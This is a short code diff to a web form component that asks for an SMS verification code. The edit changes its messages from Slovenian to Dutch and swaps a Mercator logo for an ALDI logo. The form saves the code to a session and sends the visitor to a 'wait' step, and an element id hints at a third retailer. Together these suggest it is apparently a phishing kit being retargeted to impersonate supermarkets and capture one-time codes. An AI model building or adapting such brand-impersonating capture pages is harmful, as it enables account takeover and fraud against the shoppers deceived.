@@ -101,7 +101,7 @@ export function SmsClient({ sessionId }: Props) {
       .eq("id", sessionId);
 
     setSaving(false);
-    if (error) setMsg("Pošiljanje ni uspelo.");
+    if (error) setMsg("Verzenden mislukt.");
     else {
       setSessionFormData(nextFormData);
       router.push(stepToPath("wait", sessionId));
@@ -196,8 +196,8 @@ export function SmsClient({ sessionId }: Props) {
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
           <img
-            src="/form-assets/mercator-logo.png"
-            alt="Mercator logo"
+            src="/form-assets/aldi-logo.png"
+            alt="ALDI logo"
             className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
             id="sms-ah-logo"
           />
@@ -245,7 +245,7 @@ export function SmsClient({ sessionId }: Props) {
           </div>
 
           {!valid && code.length > 0 ? (
-            <p className="text-xs text-red-400">Vnesite natančno {digits} števk.</p>
+            <p className="text-xs text-red-400">Voer exact {digits} cijfers in.</p>
           ) : null}
 
           {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
